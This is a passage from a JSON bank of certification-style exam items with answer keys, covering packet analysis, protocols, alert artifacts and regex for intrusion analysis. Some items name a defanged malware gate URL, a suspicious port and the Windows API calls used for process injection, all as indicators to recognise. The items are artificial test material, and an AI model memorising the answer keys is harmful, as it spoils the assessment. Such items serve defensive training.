reconnaissance.","trap":"Mnémo des flags : « **U**nskilled **A**ttackers **P**ester **R**eal **S**ecurity **F**olks » = URG, ACK, PSH, RST, SYN, FIN.","id":"4-033","d":4},{"t":"s","ref":"4.8","q":"Refer to the exhibit. What does 'Flags [S]' mean in this tcpdump output?","o":["The segment is a retransmission","The segment has only the SYN flag set: it is the first step of a TCP three-way handshake","The session is being reset","The segment carries application data with the PSH flag"],"a":[1],"e":"Notation tcpdump : `[S]` SYN, `[S.]` SYN-ACK, `[.]` ACK, `[P.]` PSH-ACK, `[F.]` FIN-ACK, `[R]` RST. `length 0` : pas de données, normal pour un SYN.","x":"14:22:31.104512 IP 192.168.10.5.52144 > 93.184.216.34.80: Flags [S], seq 1046273153, win 64240, options [mss 1460,sackOK,TS val 1 ecr 0,nop,wscale 7], length 0","id":"4-034","d":4},{"t":"s","ref":"4.8","q":"Which ICMP message does a router send when the TTL of a packet reaches zero, a behavior that traceroute relies on?","o":["Type 0, Echo Reply","Type 3, Destination Unreachable","Type 8, Echo Request","Type 11, Time Exceeded"],"a":[3],"e":"**Type 11 = Time Exceeded.** Type 8 = Echo Request, type 0 = Echo Reply, type 3 = Destination Unreachable (code 3 = port unreachable, réponse typique d'un port UDP fermé), type 5 = Redirect (détournable pour un MITM).","id":"4-035","d":4},{"t":"s","ref":"4.8","q":"Why is UDP the transport of choice for reflection and amplification attacks?","o":["UDP packets cannot be filtered by firewalls","UDP is connectionless, so a request with a spoofed source address is answered without any handshake validating the sender","UDP encrypts the source address","UDP headers are larger than TCP headers"],"a":[1],"e":"Pas de handshake, donc **usurper l'IP source est trivial** : la réponse part vers la victime. L'en-tête UDP ne fait que **8 octets** : port source, port destination, longueur, checksum.","id":"4-036","d":4},{"t":"s","ref":"4.8","q":"In which situations does DNS use TCP port 53 instead of UDP port 53?","o":["For every recursive query","Only when DNSSEC is disabled","For zone transfers and for responses that are too large for UDP","Never; DNS is a UDP-only protocol"],"a":[2],"e":"UDP 53 pour l'essentiel. **TCP 53** pour les **transferts de zone (AXFR / IXFR)** et quand la réponse est tronquée (bit TC). Un AXFR demandé par un hôte inconnu = **reconnaissance**.","id":"4-037","d":4},{"t":"s","ref":"4.8","q":"Which EtherType value identifies an ARP frame?","o":["0x0800","0x0806","0x86DD","0x8100"],"a":[1],"e":"**0x0800 = IPv4, 0x0806 = ARP, 0x86DD = IPv6, 0x8100 = tag 802.1Q.** Dans l'en-tête Ethernet : MAC destination, MAC source, EtherType ; le FCS est en fin de trame. Les 3 premiers octets d'une MAC = l'**OUI** (constructeur).","id":"4-038","d":4},{"t":"d","ref":"4.8","q":"Drag and drop each mail protocol onto its default port.","l":["SMTP (server-to-server relay)","SMTP submission with STARTTLS","POP3","IMAP","IMAP over TLS"],"r":["TCP 25","TCP 587","TCP 110","TCP 143","TCP 993","TCP 995"],"a":[0,1,2,3,4],"e":"SMTP **envoie** (25 entre serveurs, 587 pour la soumission authentifiée, 465 en TLS implicite). POP3 (110, 995 en TLS) **télécharge** les messages. IMAP (143, 993 en TLS) **synchronise** en les laissant sur le serveur.","id":"4-039","d":4},{"t":"s","ref":"4.8","q":"An analyst reviews the headers of a phishing email to trace its path. How should the 'Received:' lines be read?","o":["From top to bottom: the first line is the originating server","From bottom to top: each server adds its line at the top, so the lowest line is the closest to the origin","Only the first line matters; the others are decorative","They are sorted alphabetically by server name"],"a":[1],"e":"Chaque relais **empile** son en-tête `Received:` en haut. L'origine est donc **en bas**. Les lignes ajoutées par l'attaquant peuvent être forgées : on fait confiance à partir du premier serveur que l'on maîtrise.","id":"4-040","d":4},{"t":"s","ref":"4.8","q":"Which statement about HTTP/2 is relevant for intrusion analysis?","o":["It is a text-based protocol, exactly like HTTP/1.1","It opens one TCP connection per requested object","It uses binary framing, multiplexes several streams over a single TCP connection and compresses headers with HPACK, so text-based signatures written for HTTP/1.1 no longer match directly","It removes the need for TLS certificates"],"a":[2],"e":"**HTTP/2** : trames **binaires**, **multiplexage** sur une seule connexion, en-têtes compressés (**HPACK**), pseudo-en-têtes `:method`, `:path`, `:authority`. En pratique négocié via TLS (ALPN `h2`) : il faut donc déchiffrer **et** décoder pour inspecter.","id":"4-041","d":4},{"t":"s","ref":"4.8","q":"Which HTTP request header is commonly used to recover the original client IP address when the request passes through a proxy or load balancer?","o":["Referer","User-Agent","X-Forwarded-For","Accept-Encoding"],"a":[2],"e":"**X-Forwarded-For** = l'IP d'origine ajoutée par le proxy ou le load balancer. **Referer** = page d'où vient le clic. **User-Agent** = logiciel client (utile pour repérer `curl`, `sqlmap`, `python-requests`). **Host** = site demandé.","id":"4-042","d":4},{"t":"d","ref":"4.9","q":"Drag and drop each artifact found in an alert onto its category.","l":["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","VirtualAllocEx, WriteProcessMemory, CreateRemoteThread","9f2c41d0a7...77e1a7","hxxp://185.203.116.12/gate.php","49822 > 4444"],"r":["Process (file or registry)","System (API calls)","Hash","URI / URL","Client and server port identity"],"a":[0,1,2,3,4],"e":"Catégories d'artefacts du blueprint : **adresses IP**, **ports client et serveur**, **process (fichier ou registre)**, **system (appels d'API)**, **hashes**, **URI / URL**.","id":"4-043","d":4},{"t":"s","ref":"4.9","q":"An EDR alert shows that a process called VirtualAllocEx, WriteProcessMemory and then CreateRemoteThread against another process. What does this sequence indicate?","o":["Disk encryption","Process injection: code is written into the memory of another process and executed there","Keylogging","A DNS lookup"],"a":[1],"e":"Trio classique de l'**injection de processus** : allouer de la mémoire dans la cible, y écrire le code, créer un thread distant pour l'exécuter. Objectif : se cacher dans un processus légitime (`explorer.exe`, `svchost.exe`).","trap":"Autres appels parlants : `SetWindowsHookEx` et `GetAsyncKeyState` = keylogger ; `CryptEncrypt` en masse = ransomware ; `URLDownloadToFile` = téléchargeur.","id":"4-044","d":4},{"t":"s","ref":"4.9","q":"In the flow 10.1.1.5:49734 -> 172.16.9.20:445, which statement is correct?","o":["10.1.1.5 is the server because its port number is higher","172.16.9.20 is the server: 445 is the well-known SMB port, and 49734 is an ephemeral client port","Both hosts are clients","Port 445 identifies an HTTPS server"],"a":[1],"e":"Port **well-known** (0-1023) ou enregistré = **serveur**. Port **éphémère** (49152-65535 sous Windows, 32768-60999 sous Linux) = **client**. 445 = SMB.","id":"4-045","d":4},{"t":"s","ref":"4.10","q":"Which string is matched by the regular expression ^[A-Z]{2}\\d{4}$ ?","o":["ab1234","AB1234","ABC123","AB12345"],"a":[1],"e":"`^` début, `[A-Z]{2}` exactement deux majuscules, `\\d{4}` exactement quatre chiffres, `$` fin. `ab1234` : minuscules. `ABC123` : 3 lettres et 3 chiffres. `AB12345` : un chiffre de trop, bloqué par `$`.","id":"4-046","d":4},{"t":"s","ref":"4.10","q":"An analyst searches logs with the regular expression \\b[a-f0-9]{32}\\b. What is this expression designed to find?","o":["IPv4 addresses","SHA-256 hashes","MD5 hashes written in lowercase hexadecimal","Email addresses"],"a":[2],"e":"32 caractères hexadécimaux = **MD5** (128 bits). **40 = SHA-1**, **64 = SHA-256**. `\\b` = frontière de mot, pour éviter de matcher un morceau de chaîne plus longue.","id":"4-047","d":4},{"t":"s","ref":"4.10","q":"Which regular expression matches file names that end with .exe, .dll or .scr?","o":["^\\.(exe|dll|scr)","\\.(exe|dll|scr)$","[exe|dll|scr]$","\\.exe|dll|scr"],"a":[1],"e":"`\\.` = un point littéral, `( | | )` = alternatives groupées, `$` = fin de chaîne. Les crochets `[ ]` définissent une **classe de caractères** (un seul caractère parmi e, x, d, l, s, c, r, |), pas des mots. Sans parenthèses, `\\.exe|dll|scr` signifie « .exe » **ou** « dll » **ou** « scr » n'importe où.","id":"4-048","d":4},{"t":"s","ref":"4.10","q":"A rule uses the pattern 192.168.1.1 without escaping the dots. Which string, other than the intended IP address, also matches?","o":["192-168-1","192x168y1z1","192.168.11","19216811"],"a":[1],"e":"Un `.` non échappé = **n'importe quel caractère** (un seul). Donc `192x168y1z1` matche. Pour cibler l'IP : `192\\.168\\.1\\.1`. Piège d'exam classique.","id":"4-049","d":4},{"t":"d","ref":"4.10","q":"Drag and drop each regular expression token onto its meaning.","l":["*","+","?","[^0-9]","^"],"r":["Zero or more of the preceding element","One or more of the preceding element","Zero or one
